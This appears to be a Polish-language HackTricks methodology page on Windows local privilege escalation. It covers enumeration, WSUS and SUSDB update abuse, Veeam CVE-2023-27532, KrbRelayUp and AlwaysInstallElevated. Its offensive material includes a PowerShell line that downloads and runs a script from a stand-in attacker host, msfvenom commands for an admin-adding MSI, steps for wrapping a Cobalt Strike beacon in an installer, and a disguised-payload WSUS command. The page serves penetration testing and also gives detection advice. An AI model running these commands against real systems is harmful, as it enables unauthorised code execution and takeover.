# Eskalacja uprawnień lokalnych w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona gromadzi ogólną metodykę eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Opisany tu praktyczny proces enumeracji uwzględnia również materiały z warsztatów społeczności i list kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację z DerbyCon na temat eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy Windows

### Access Tokens

**Jeśli nie wiesz, czym są tokeny dostępu w Windows, przed kontynuowaniem przeczytaj następującą stronę:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji na temat ACLs - DACLs/SACLs/ACEs znajdziesz na następującej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przed kontynuowaniem przeczytaj następującą stronę:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji pod kątem eskalacji uprawnień **przeczytaj** następującą **stronę** i **sprawdź** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić zmianę UEFI NVRAM w trybie offline, która prowadzi do DMA przed uruchomieniem systemu i łańcucha modyfikacji pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / ciche podniesienie uprawnień UIAccess

Procesy UIAccess uruchomione przez `RAiLaunchAdminProcess` mogą zostać wykorzystane do uzyskania High IL bez monitów, gdy kontrole bezpiecznej ścieżki AppInfo zostaną ominięte. Szczegółowy opis procesu omijania UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Można wykorzystać propagację wpisów rejestru dostępności Secure Desktop do wykonania dowolnego zapisu do rejestru z uprawnieniami SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze kompilacje Windows wprowadziły również ścieżkę LPE **SMB arbitrary-port**, w której uprzywilejowane uwierzytelnianie NTLM z lokalnego systemu jest odbijane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy dana wersja Windows zawiera znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity zależne od wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach Microsoft. Ta baza danych zawiera ponad 4700 luk, co pokazuje **ogromną powierzchnię ataku** środowiska Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — tworzy wykaz kompilacji systemu operacyjnego, zainstalowanych aktualizacji i wybranych potencjalnie istotnych advisory; przed uznaniem wyniku za właściwy sprawdź dokładny produkt i aktualizacje zastępujące.

W przypadku lokalnego exploita zależnego od wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym Windows proces 32-bitowy podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje katalog systemowy 32-bitowy, natomiast `%windir%\Sysnative` zapewnia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten nie jest dostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego ani potencjalny brak aktualizacji KB nie dowodzą, że exploit zadziała; porównaj uruchomioną kompilację, zainstalowaną aktualizację lub aktualizację ją zastępującą, architekturę procesu oraz wymagania exploita z [biuletynem zabezpieczeń Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

**Lokalnie, z użyciem informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy zmienne środowiskowe zawierają jakieś dane uwierzytelniające lub inne cenne informacje?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShella

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Informacje o tym, jak włączyć tę funkcję, znajdziesz na stronie [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) domyślnie zapisują pliki w folderze Documents każdego użytkownika, ale ustawienie `OutputDirectory` lub `Start-Transcript -OutputDirectory` może przekierować je do folderu współdzielonego lub ukrytego. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę zapisu i ACL pliku: może on zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest jedynie wskazówką, jeśli jej treść ujawnia dane tożsamości z wyższymi uprawnieniami, których można użyć do logowania w odpowiednim kontekście.

### Rejestrowanie modułów PowerShell

Rejestrowane są szczegóły wykonywania potoku PowerShell, w tym wykonywane polecenia, wywołania poleceń i fragmenty skryptów. Mogą jednak nie zostać przechwycone pełne szczegóły wykonania ani wyniki.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji „Pliki transkrypcji” w dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić ostatnie 15 zdarzeń z logów PowerShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowana jest pełna aktywność i cała zawartość wykonywanego skryptu, dzięki czemu każdy blok kodu jest dokumentowany podczas działania. Proces ten zapewnia kompleksowy ślad audytowy każdej aktywności, przydatny w analizie śledczej i badaniu złośliwego zachowania. Dokumentowanie całej aktywności w czasie wykonywania zapewnia szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowania dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, użyj:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Punkt końcowy WSUS używający HTTP jest wskazówką, by sprawdzić możliwość przechwycenia metadanych aktualizacji. Wykorzystanie tej możliwości zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić ruch lub nim sterować oraz jakie zasady zaufania do aktualizacji i ich instalowania obowiązują na kliencie. Sam adres URL nie oznacza możliwości wykonania kodu. [Microsoft zaleca używanie TLS w przypadku metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zacznij od sprawdzenia, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając wiersz polecenia cmd i wpisując:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe polecenie w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ma wartość `1`.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie jednego z warunków wstępnych dla przechwytywania ruchu HTTP, ale nie dowodzi, że przechwycenie, akceptacja złośliwej aktualizacji lub instalacja z podwyższonymi uprawnieniami są możliwe. Gdy ma wartość `0`, ta konkretna skonfigurowana lokalizacja WSUS nie jest wybierana przez tę zasadę.

Do wykorzystania tej podatności można użyć narzędzi takich jak [Wsuxploit](https://github.com/pimps/wsuxploit) i [pyWSUS ](https://github.com/GoSecure/pywsus) — są to uzbrojone skrypty exploitów MiTM służące do wstrzykiwania „fałszywych” aktualizacji do niezabezpieczonego ruchem SSL WSUS.

Zapoznaj się z tym opracowaniem:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo ta podatność wykorzystuje następującą lukę:

> Jeśli możemy zmienić ustawienia proxy naszego lokalnego użytkownika, a Windows Update korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod z podwyższonymi uprawnieniami na naszym systemie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa również jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z podpisem własnym dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwycić ruch WSUS zarówno HTTP, jak i HTTPS. WSUS nie stosuje mechanizmów podobnych do HSTS, które realizowałyby weryfikację certyfikatu w modelu trust-on-first-use. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i zawiera prawidłową nazwę hosta, usługa go zaakceptuje.

Tę podatność można wykorzystać za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS kontrolowane przez administratora

Istnieje osobna ścieżka ataku, jeśli bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` serwera oraz wszystkie delegowane uprawnienia WSUS, a następnie ustal, która grupa komputerów klienckich otrzymałaby zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [opisuje relację zaufania dla publikowania](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu do publikowania lokalnej zawartości. Zanim uznasz to za ścieżkę eskalacji, potwierdź, że kandydacka aktualizacja jest podpisana i akceptowana, dotyczy celu oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane payloady przez `.txt`/`.esd`

Jest to odrębne naruszenie granicy zaufania, inne niż przechwytywanie połączenia HTTP z WSUS: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** wystarczający do opublikowania i zatwierdzenia niestandardowej aktualizacji. Jedną z praktycznych metod uzyskania dostępu jest przekazanie uwierzytelnienia konta komputera upstreamowego WSUS do osobnego serwera MSSQL hostującego `SUSDB`; dokładne wymagania zależą od wdrożenia, dlatego najpierw sprawdź uprawnienia `EXECUTE`, zamiast zakładać, że wymagane są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o odrębnej ścieżce ataku, która przekazuje uwierzytelnienie klienta WSUS z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w artykule [Nadużywanie WSUS HTTP do przekaźnika NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Utworzenie, wskazanie celu i zatwierdzenie aktualizacji

Proces publikowania niestandardowej aktualizacji wykorzystuje standardowe procedury WSUS jako ograniczone API publikowania. Kluczowe zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Importowanie metadanych aktualizacji | `spImportUpdate` |
| Zapisanie fragmentów XML dotyczących wymagań wstępnych, lokalizacji i rozszerzeń | `spSaveXMLFragment` |
| Powiązanie skrótu zawartości z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyliczenie lub utworzenie grupy komputerów i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar oraz obsługa `CommandLineInstallation` muszą być zgodne we wszystkich importowanych metadanych i fragmentach. Po przypisaniu adresu URL zawartości i grupy docelowej końcowe zatwierdzenie wygląda podobnie do poniższego; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia, zamiast ponownie wykorzystywać przykładowe identyfikatory GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Obejście weryfikacji podpisu sterowane rozszerzeniem

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez wcześniejszego sprawdzenia, czy bajty stanowią tekst lub prawidłowy obraz ESD. Dlatego niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji aktualizacji wykorzystującą wiersz poleceń. To błąd pomylenia typów na poziomie zasad, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging i automatyzacja zgodne z BITS

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Serwer źródłowy musi spełniać wymagania BITS dotyczące HTTP: sam dostępny URL nie wystarczy, ponieważ transfer wykorzystuje początkową sekwencję `HEAD`/`GET` oraz żądania zakresów bajtów. Serwer bez obsługi Range powoduje wyświetlenie zdarzenia synchronizacji WSUS `EventId=364` z informacją, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany do wykonania łańcucha import/fragment/URL/grupa/wdrożenie, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz dostarcza `BitsWebServer.py` do stagingu zawartości. Minimalne polecenie do użycia w autoryzowanym laboratorium:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nieobsługiwana interakcja i trwałość ponawiania

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie ze skonfigurowanym harmonogramem, bez ręcznego wybierania jej przez użytkownika. Podczas testów payload, którego aktualizacja nadal kończyła się niepowodzeniem lub pozostawała niekompletna, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc zachowanie związane z ponawianiem może prowadzić do cyklicznej trwałości wykonywania; jest to jednak głośne, ponieważ klient sygnalizuje niepowodzenie aktualizacji.<sup>[[39]](#references)</sup>

#### Wykrywanie i utwardzanie

Przydatne punkty analizy po stronie serwera i klienta w tym łańcuchu to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; sprawdzaj nowe grupy docelowe, zewnętrzne źródła treści, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanej nazwy `FileVerficationFailed` i `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą pliku, zamiast ufać rozszerzeniu.
- Wyszukuj przypadki wielokrotnego niepowodzenia i ponawiania instalacji Windows Update, a także wykonywanie plików PE lub nieoczekiwaną aktywność procesów potomnych/sieciową związaną z treścią o nazwie z rozszerzeniem `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication w usłudze bazy danych i ogranicz dostęp sieciowy do bazy do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur niestandardowych aktualizacji.

## Zewnętrzne mechanizmy Auto-Updaters i IPC agentów (local privesc)

Wiele agentów korporacyjnych udostępnia lokalny interfejs IPC oraz uprzywilejowany kanał aktualizacji. Jeśli można wymusić rejestrację z serwerem atakującego, a updater ufa fałszywemu głównemu urzędowi certyfikacji lub stosuje słabe kontrole podpisu, użytkownik lokalny może dostarczyć złośliwy plik MSI, który usługa SYSTEM zainstaluje. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi kopii zapasowych na **TCP/9401**. [Komunikat Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych poświadczeń bazy danych konfiguracji w obrębie sieci kopii zapasowych; odrębny publiczny PoC demonstruje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać nie tylko na localhost, dlatego sprawdź jej faktyczny adres i PID.

- **Rozpoznanie**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie pełna weryfikacja poprawek.
- **Wersje bazowe zawierające poprawkę**: Veeam wskazuje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wydania zawierające poprawkę; wcześniejsze wydania są podatne. Sama czteroczęściowa wersja pliku nie pozwala odróżnić niezałatanej wersji bazowej od późniejszej poprawki opartej na tych samych numerach kompilacji. Przed uznaniem granicznej kompilacji za poprawioną zweryfikuj identyfikator poprawki w [historii kompilacji dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, na przykład `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie uruchom payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Cytowane PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe wymagania wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.
## KrbRelayUp

Lokalny relay Kerberos może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, gdy odpowiedni serwer COM uwierzytelni się, a przekazany principal ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zapisy LDAP dla RBCD i `msDS-KeyCredentialLink` (shadow credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiedniej delegacji i uprawnień do obiektu docelowego, natomiast łańcuch shadow credential wymaga uprawnień do zapisu klucza poświadczeń oraz KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź zasady dotyczące [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [wiązania kanału LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) na rzeczywistym DC, ACL obiektu dla przekazywanej tożsamości oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Znaczenie mają typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Wynik mogą też zmienić routing firewall/OXID i zainstalowane aktualizacje. Traktuj liberalną zasadę lub pasujący ACL jako element wymagający przeglądu; pasywna enumeracja nie powinna wywoływać COM coercion, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta maszyny może prowadzić do uzyskania biletu maszyny, a jeśli to konto ma wymagane uprawnienia replikacji katalogu — do odrębnej ścieżki DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz w artykule [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 rejestry są **włączone** (wartość to **0x1**), użytkownicy o dowolnym poziomie uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik MSI systemu Windows służący do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (wymagany będzie więc dostęp GIU):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby podnieść uprawnienia.

### MSI Wrapper

Przeczytaj ten tutorial, aby dowiedzieć się, jak utworzyć MSI wrapper przy użyciu tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli **chcesz tylko** **wykonywać** **polecenia**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **nowy payload Windows EXE TCP** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizację wybierz **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż przejdziesz do kroku 3 z 4 (wybór plików do dołączenia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a następnie w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić także inne właściwości, takie jak **Author** i **Manufacturer**, dzięki czemu zainstalowana aplikacja może wyglądać bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony zaraz po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### MSI Installation

Aby wykonać **instalację** złośliwego pliku `.msi` **w tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i narzędzia wykrywające

### Ustawienia audytu

Te ustawienia określają, co jest **rejestrowane**, więc warto zwrócić na nie uwagę.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

